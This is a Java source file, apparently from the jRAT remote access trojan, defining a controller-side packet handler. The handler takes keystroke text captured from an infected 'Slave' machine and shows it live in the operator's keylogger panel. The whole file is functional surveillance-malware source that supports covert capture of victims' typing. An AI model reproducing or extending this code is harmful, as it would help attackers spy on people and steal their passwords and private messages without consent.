
package jrat.module.keys.packets;

import jrat.controller.Slave;
import jrat.controller.packets.incoming.IncomingPacket;
import jrat.controller.packets.outgoing.OutgoingPacket;
import jrat.module.keys.ui.DayTreeNode;
import jrat.module.keys.ui.MonthTreeNode;
import jrat.module.keys.ui.PanelKeylogger;
import jrat.module.keys.ui.YearTreeNode;

import javax.swing.tree.DefaultMutableTreeNode;

public class PacketKey implements IncomingPacket, OutgoingPacket {

	@Override
	public void read(Slave client) throws Exception {
	    String keyText = client.readLine();

        PanelKeylogger panel = (PanelKeylogger) client.getPanel(PanelKeylogger.class);
			
        if (panel != null) {
            panel.appendOnline(keyText);
        }
    }

    public void write(Slave slave) throws Exception {

    }

	public short getPacketId() {
	    return 124;
    }

}
